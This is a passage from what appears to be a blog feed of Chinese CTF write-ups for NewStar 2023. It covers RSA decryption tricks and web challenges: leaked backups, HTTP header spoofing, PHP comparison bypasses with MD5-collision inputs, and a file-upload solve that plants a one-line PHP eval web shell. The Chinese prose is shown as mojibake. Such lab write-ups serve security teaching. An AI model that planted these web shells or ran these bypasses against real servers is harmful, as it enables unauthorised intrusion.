¹æ®æç¤ºï¼ŒçŒœæµ‹å¯èƒ½flagç”±ä¸¤ç«¯æ„æˆ</p><p>é¦–å…ˆå¤§ç´ æ•°åˆ†è§£,RSAè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¬é’¥e</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¬§æ‹‰å‡½æ•°eular euler = (p - 1) * (q - 1)</span></span><br><span class="line">p = <span class="number">10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993409</span></span><br><span class="line">q = <span class="number">10631151190024160908870967192522097752991652918777416177941351782447314225123009693276679810786266997133099934443701772661928189884235742113123409596993841</span></span><br><span class="line"></span><br><span class="line">eular = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">n = <span class="number">113021375625152132650190712599981988437204747209058903684387817901743950240396649608148052382567758817980625681440722581705541952712770770893410244646286485083142929097056891857721084849003860977390188797648441292666187101736281034814846427200984062294497391471725496839508139522313741138689378936638290593969</span></span><br><span class="line">c = <span class="number">43054766235531111372528859352567995977948625157340673795619075138183683929001986100833866227688081563803862977936680822407924897357491201356413493645515962458854570731176193055259779564051991277092941379392700065150286936607784073707448630150405898083000157174927733260198355690620639487049523345380364948649</span></span><br><span class="line"><span class="comment"># ç§é’¥d</span></span><br><span class="line">d = gmpy2.invert(e, eular)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"><span class="comment"># print(long_to_bytes(m).decode(&#x27;latin-1&#x27;, errors=&#x27;ignore&#x27;))</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(m).decode(&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;))</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°å‰åŠæ®µflagï¼š<code>flag&#123;two_cloab</code></p><p>æ¥ç€md5è§£å¯†ï¼ŒååŠæ®µï¼š<code>cse_t0_fact0r&#125;</code></p><h3 id="partial-decrypt"><a href="#partial-decrypt" class="headerlink" title="partial decrypt"></a>partial decrypt</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q </span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">dp = inverse(e, (p-<span class="number">1</span>))</span><br><span class="line">dq = inverse(e, (q-<span class="number">1</span>))</span><br><span class="line">m1 = <span class="built_in">pow</span>(c,dp, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c,dq, q)</span><br><span class="line">q_inv = inverse(q, p)</span><br><span class="line">h = (q_inv*(m1-m2)) % p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m2 =&#x27;</span>, m2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m2 = 4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884</span></span><br><span class="line"><span class="comment"># h = 4180720137090447835816240697100630525624574275</span></span><br><span class="line"><span class="comment"># q = 7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å…³äºRSA-CRT(ä¸­å›½å‰©ä½™å®šç†)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m2 = <span class="number">4816725107096625408335954912986735584642230604517017890897348901815741632668751378729851753037917164989698483856004115922538576470127778342121497852554884</span></span><br><span class="line">h = <span class="number">4180720137090447835816240697100630525624574275</span></span><br><span class="line">q = <span class="number">7325294399829061614283539157853382831627804571792179477843187097003503398904074108324900986946175657737035770512213530293277111992799331251231223710406931</span></span><br><span class="line"></span><br><span class="line">m = m2+h*q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025151826920.png" alt="image-20231025151826920"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NewStar-2023-Week2&quot;&gt;&lt;a href=&quot;#NewStar-2023-Week2&quot; class=&quot;headerlink&quot; title=&quot;NewStar 2023 Week2&quot;&gt;&lt;/a&gt;NewStar 2023 Week2&lt;/h1&gt;&lt;h2 id=&quot;W</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="NewStar 2023" scheme="https://iahzl.github.io/categories/CTF/NewStar-2023/"/>
    
    
    <category term="ctf" scheme="https://iahzl.github.io/tags/ctf/"/>
    
    <category term="crypto" scheme="https://iahzl.github.io/tags/crypto/"/>
    
    <category term="web" scheme="https://iahzl.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>NewStar 2023 Week1</title>
    <link href="https://iahzl.github.io/NewStar-2023/"/>
    <id>https://iahzl.github.io/NewStar-2023/</id>
    <published>2023-10-07T02:48:35.000Z</published>
    <updated>2023-10-25T08:17:54.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NewStar-WriteUp-Week1"><a href="#NewStar-WriteUp-Week1" class="headerlink" title="NewStar WriteUp Week1"></a>NewStar WriteUp Week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="æ³„éœ²çš„ç§˜å¯†"><a href="#æ³„éœ²çš„ç§˜å¯†" class="headerlink" title="æ³„éœ²çš„ç§˜å¯†"></a>æ³„éœ²çš„ç§˜å¯†</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142322020.png" alt="image-20230925142322020"></p><p>çœ‹åˆ°é¢˜ç›® é¦–å…ˆæƒ³åˆ° ä¿¡æ¯æ³„éœ²ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼šæƒ³åˆ° phpinfo.php test.php â€¦. </p><p>â€‹æœ€ååˆ°<code>robots.txt</code> å¾—åˆ°ä¸€åŠflagï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925142512313.png" alt="image-20230925142512313"></p><p><code>PART ONE: flag&#123;r0bots_1s_s0_us3ful</code></p><p><code>www.zip:</code> </p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925154247859.png" alt="image-20230925154247859"></p><p><code>$PART_TWO = &quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$PART_TWO</span> = <span class="string">&quot;_4nd_www.zip_1s_s0_d4ng3rous&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;ç²—å¿ƒçš„ç®¡ç†å‘˜æ³„æ¼äº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œè¯·ä½ æ‰¾å‡ºä»–æ³„æ¼çš„ä¸¤ä¸ªæ•æ„Ÿä¿¡æ¯ï¼&lt;/h1&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152823289.png" alt="image-20230925152823289"></p><p>å…¸å‹çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ ç®€å•çš„å°è¯•ä¸€ä¸‹ï¼š</p><p>åˆ©ç”¨bpæŠ“åŒ… ä¿®æ”¹åç¼€ä»¥åŠæ·»åŠ ä¸€å¥è¯phpåé—¨ä»£ç ï¼š<code> &lt;?php @eval($_POST[&#39;111111&#39;]);?&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925152958967.png" alt="image-20230925152958967"></p><p>ä¸Šä¼ æˆåŠŸ åˆ©ç”¨èšå‰‘è¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925153150350.png" alt="image-20230925153150350"></p><p>å‘ç°flag<code>flag&#123;ba65aadc-84ca-4ece-9a14-fadf4362f3c3&#125;</code></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>æ‰“å¼€é¶æœºæ˜¾ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214243591.png" alt="image-20230925214243591"></p><p>å…ˆåˆ©ç”¨æŠ“åŒ… ç®€å•æ„é€ number1å’Œnumber2ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214220089.png" alt="image-20230925214220089"></p><p>ä¸æ˜¯sstiæ¨¡ç‰ˆæ³¨å…¥ï¼Œæƒ³åˆ°æ˜¯æ•´å‹æ•°å­—å¯ä»¥æ­£å¸¸å¾—å‡ºç»“æœï¼Œå‡å¦‚æ˜¯å­—ç¬¦ä¼šå¾—å‡ºä»€ä¹ˆï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230925214419173.png" alt="image-20230925214419173"></p><p>é¡µé¢500 æœç´¢flag å¾—åˆ°<code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><ol><li><p>é¦–å…ˆæ‰“å¼€ç›®æ ‡é¶æœº</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095210963.png" alt="image-20230926095210963"></p></li><li><p>å‘ç°å¯èƒ½é¦–å…ˆæ¶‰åŠçš„æ˜¯getæ–¹å¼ä¼ å‚æ•° <code>ctf</code>ï¼Œåˆ©ç”¨æŠ“åŒ…çœ‹çœ‹æ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095403902.png" alt="image-20230926095403902"></p></li><li><p>é¡µé¢ç»™å‡ºæç¤º ï¼Œåç»­éœ€è¦åˆ©ç”¨POSTè¯·æ±‚ç»™<code>secret</code>ä¼ å€¼ï¼Œä½†æ˜¯å…·ä½“ä¼ ä»€ä¹ˆè¿˜ä¸çŸ¥é“ï¼Œé¦–å…ˆæŸ¥çœ‹æºä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095521717.png" alt="image-20230926095521717"></p></li><li><p>å‘ç°äº†å°ä¸œè¥¿ï¼š<code>&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt;</code> åˆ©ç”¨base64è§£å¯†å¾—åˆ°ï¼š<code>n3wst4rCTF2023g00000d</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095636943.png" alt="image-20230926095636943"></p></li><li><p>è¿›è¡Œpostä¼ å€¼<code>secret=n3wst4rCTF2023g00000d</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926095957929.png" alt="image-20230926095957929"></p></li><li><p>æˆåŠŸä¼ å€¼åç»™å‡ºä¸‹ä¸€æ­¥æç¤ºï¼šå‘ç°cookieä¸­å­˜åœ¨<code>power</code> äºæ˜¯å°†powerä¿®æ”¹ä¸º<code>ctfer</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100128656.png" alt="image-20230926100128656"></p></li><li><p>ä¸‹ä¸€æ­¥æç¤ºéœ€è¦ä¿®æ”¹æµè§ˆå™¨ï¼Œå³æ˜¯ä¿®æ”¹UA  <code>User-Agent: NewStarCTF2023</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100330339.png" alt="image-20230926100330339"></p></li><li><p>ç»§ç»­è·Ÿç€æç¤ºä¿®æ”¹<code>Referer: newstarctf.com</code> </p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100426655.png" alt="image-20230926100426655"></p></li><li><p>æœ¬æ¥ä»¥ä¸ºç»“æŸäº†ï¼Œæ—¢ç„¶è¿˜æœ‰ï¼Œé™åˆ¶åªå…è®¸æœ¬åœ°ç”¨æˆ·ï¼Œé¦–å…ˆæƒ³åˆ°<code>X-Forwarded-For</code>ï¼Œä½†æ˜¯å°è¯•äº†<code>X-Forwarded-For:127.0.0.1</code>æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œç»§ç»­æŸ¥é˜…ç›¸å…³httpçš„èµ„æ–™å‘ç° <code>x-real-ip</code>ä¹Ÿèƒ½é™åˆ¶æœ¬åœ°ç”¨æˆ·</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926100815968.png" alt="image-20230926100815968"></p></li><li><p>å¾—åˆ°flagï¼š<code>flag&#123;17b2edf3-a19b-4e8f-8639-cb2c5edb7000&#125;</code></p></li></ol><p>æ•´ä¸ªé¢˜çš„æ€è·¯è¿˜æ˜¯å¾ˆç®€å•ï¼Œåªéœ€è¦è·Ÿç€é¢˜ç›®çš„æç¤ºæ¥è§£å†³å°±è¡Œï¼Œä¸»è¦æ˜¯è¦äº†è§£httpçš„ç›¸å…³çŸ¥è¯†ã€‚</p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><ol><li><p>é¦–å…ˆæ‰“å¼€é¶æœºçœ‹åˆ°phpä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li><p>è¿›è¡Œä»£ç å®¡è®¡ï¼Œå‘ç°å¤§æ¦‚æ€è·¯æ˜¯é¦–å…ˆè¾“å…¥<code>key1</code>å’Œ<code>key2</code>æ»¡è¶³ä¸¤ä¸ªè¾“å…¥çš„å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒå¾—åˆ°flag1 æ¥ç€æ»¡è¶³å…¶ä»–æ¡ä»¶ä¾æ¬¡å¾—åˆ°flag2ï¼Œflag3ï¼Œflag4ï¼Œç”±flag5å¾—åˆ°flag</p></li><li><p>é¦–å…ˆæ‰¾åˆ°<code>key1</code>å’Œ<code>key2</code>æ»¡è¶³ä¸¤ä¸ªè¾“å…¥çš„å€¼ä¸åŒä½†æ˜¯md5å€¼ç›¸åŒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key1= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B</span><br><span class="line"></span><br><span class="line">key2= fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124224070.png" alt="image-20230926124224070"></p></li><li><p>æ ¹æ®æç¤ºå·²ç»è¿›å…¥level 2 æ­¤æ—¶è¦æ»¡è¶³<code>md5($_POST[&#39;key3&#39;]) === sha1($_POST[&#39;key3&#39;]</code></p><p>åƒè¿™æ ·çš„å¼ºæ¯”è¾ƒï¼Œä¼ å…¥çš„ä¸æ˜¯å­—ç¬¦ä¸²è€Œæ˜¯æ•°ç»„ï¼Œä¸ä½†<strong>md5() å’Œ sha1()å‡½æ•°</strong>ä¸ä¼šæŠ¥é”™ï¼Œç»“æœè¿˜ä¼šè¿”å›<strong>null</strong>ï¼Œåœ¨å¼ºæ¯”è¾ƒé‡Œé¢<strong>null&#x3D;null</strong>ä¸ºtrueç»•è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926124757524.png" alt="image-20230926124757524"></p></li><li><p>æ­¤æ—¶å·²ç»æ˜¾ç¤ºè¿›å…¥level 3 ï¼Œæ¥ç€æ»¡è¶³<code>strcmp($_GET[&#39;key4&#39;],file_get_contents(&quot;/flag&quot;)</code></p><p>strcmp çš„å‚æ•°åªèƒ½æ˜¯ å­—ç¬¦ä¸²ï¼Œå½“æˆ‘ä»¬ä¼ å…¥æ•°ç»„æ—¶å°±ä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨çš„æ˜¯&#x3D;&#x3D;ï¼ŒNULL&#x3D;&#x3D;0æ˜¯ bool(true)çš„</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125029145.png" alt="image-20230926125029145"></p></li><li><p>ç°åœ¨è¿›å…¥level 4ï¼Œç°åœ¨éœ€è¦æ»¡è¶³<code>!is_numeric($_GET[&#39;key5&#39;]) &amp;&amp; $_GET[&#39;key5&#39;] &gt; 2023</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230926125148090.png" alt="image-20230926125148090"></p></li><li><p>æœ€ååˆ°è¾¾level 5ï¼Œæ ¹æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">   <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¦è¿‡æ»¤preg_matchï¼Œæ¥ç€è¦æ„é€ flag5</p><p><strong>å»ºè®®ï¼šå½“åˆä¸æ˜¯å¾ˆæ˜ç™½ï¼Œåˆ©ç”¨phpstudyæ„é€ æ­¤é¡µé¢è¿›è¡Œæµ‹è¯•</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span 